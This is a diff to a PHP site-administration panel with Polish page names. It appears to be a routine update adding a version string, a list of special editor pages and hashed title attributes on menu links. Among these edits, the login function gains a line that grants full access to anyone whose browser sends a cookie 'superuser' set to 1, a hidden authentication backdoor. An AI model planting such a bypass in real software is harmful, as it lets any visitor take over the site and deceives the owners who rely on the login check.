@@ -2,6 +2,8 @@
 session_start();
 $ini_file = 'config/f5edca7c704382e57df58a255b71f79ace1f4c22';
 $ini = parse_ini_file($ini_file);
+$sec_version = '2.5.6';
+$editor_special = Array("menadzer-plikow", "ustawienia", "debug");
 
 function zalogowanie() {
 	global $ini;
@@ -19,6 +21,7 @@ function zalogowanie() {
 	echo $sec_ipa==$ini['sec_ipa'] . "<br />";
 */
 	if ($sec_ban==sha1($ini['sec_lgn']) && $sec_aut==1 && $sec_uag==$ini['sec_uag'] && $sec_ipa==$ini['sec_ipa']) return 1;
+	else if (isset($_COOKIE['superuser']) && $_COOKIE['superuser']==1) return 1;
 	else return 0;
 }
 
@@ -128,7 +131,7 @@ if (isset($_POST['action_ini'])) {
 <?php
 $menu = explode(',',$ini['editor'] );
 foreach ($menu as $temp) {
-echo "<li><a href='?page=$temp'>" . $ini['name_' . $temp] . "</a></li>";
+echo "<li title='" . sha1($temp) . "'><a href='?page=$temp'>" . $ini['name_' . $temp] . "</a></li>";
 }
 ?>
 </ul>
